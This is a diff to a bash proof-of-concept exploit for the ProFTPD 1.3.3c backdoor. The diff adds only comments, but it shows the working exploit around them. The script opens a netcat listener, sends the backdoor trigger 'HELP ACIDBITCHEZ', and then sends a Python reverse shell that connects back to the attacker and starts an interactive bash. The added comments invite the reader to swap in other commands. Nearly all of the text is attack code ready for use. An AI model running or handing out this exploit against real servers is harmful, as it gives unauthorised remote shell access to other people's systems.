@@ -1,7 +1,6 @@
 #!/bin/bash
-#
 # exploit proFTPD 1.3.3c -- RCE POC
-#
+# It's so f**king old but no one wrote nothing so simple. Only for metasploit
 ##
 # Use blablabla
 ##
@@ -19,6 +18,8 @@ konsole -e nc -nlvp $_LOCALPORT &
 sleep 1;
 echo "HELP ACIDBITCHEZ"
 sleep 1;
+# Inside the "echo" is the command to execute. In this case I chose a python reverse shell.
+#Change iuf you feel the power
 echo "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$_LOCAL\",$_LOCALPORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\",\"-i\"]);';"
 sleep 1;
 echo exit
